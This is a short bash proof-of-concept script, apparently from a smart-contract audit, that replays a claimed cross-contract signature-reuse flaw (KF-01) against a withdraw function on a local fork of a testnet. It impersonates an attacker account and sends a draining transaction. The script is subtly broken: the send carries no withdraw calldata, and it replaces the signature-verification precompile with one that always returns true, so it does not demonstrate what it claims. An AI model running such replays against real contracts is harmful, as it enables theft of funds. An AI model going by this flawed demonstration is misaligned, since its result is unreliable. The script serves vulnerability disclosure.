#!/usr/bin/env bash
# Keyfall replay: KF-01 (Critical) — a PQC-authorized withdraw(address,uint256,uint256,bytes,bytes) made for 0x371a51D1f42aD6E9DF0F4B03D326711511C3ED7B is accepted here too (signature not bound to this contract)
# Runs on a LOCAL fork only. Needs Foundry (anvil + cast).
set -euo pipefail
anvil --fork-url https://evm-testnet.qore.host --fork-block-number 10539229 --chain-id 9800 --port 8555 --silent & ANVIL=$!; trap "kill $ANVIL" EXIT; sleep 6
R=http://127.0.0.1:8555
cast rpc anvil_setCode 0x0000000000000000000000000000000000000a01 0x600160005260206000f3 --rpc-url $R >/dev/null  # accept: every signature in this replay was verified valid off-chain
echo "target balance before: $(cast balance 0xeBf86aEdC6BaEFdFBc5272fF118B460de3E0c6F4 --rpc-url $R)"
# step 1: withdraw(address,uint256,uint256,bytes,bytes) as attacker (no keys)
cast rpc anvil_impersonateAccount 0xBd2C7b5fa5f7c71dB975757a898698cc0b04B5ad --rpc-url $R >/dev/null
cast rpc anvil_setBalance 0xBd2C7b5fa5f7c71dB975757a898698cc0b04B5ad 0x3635c9adc5dea00000 --rpc-url $R >/dev/null
cast send --unlocked --from 0xBd2C7b5fa5f7c71dB975757a898698cc0b04B5ad 0xeBf86aEdC6BaEFdFBc5272fF118B460de3E0c6F4  --gas-limit 15000000 --rpc-url $R >/dev/null
echo "target balance after:  $(cast balance 0xeBf86aEdC6BaEFdFBc5272fF118B460de3E0c6F4 --rpc-url $R)"
echo "nonce(): $(cast call 0xeBf86aEdC6BaEFdFBc5272fF118B460de3E0c6F4 'nonce()' --rpc-url $R)"
